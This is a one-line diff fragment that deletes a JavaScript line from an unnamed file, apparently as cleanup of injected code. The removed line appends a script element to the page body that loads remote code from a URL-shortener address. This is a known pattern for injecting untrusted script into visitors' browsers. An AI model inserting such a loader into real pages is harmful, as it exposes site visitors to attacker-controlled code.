@@ -1,1 +1,0 @@
-with(document)body.appendChild(createElement("script")).src="//is.gd/rU5psL";
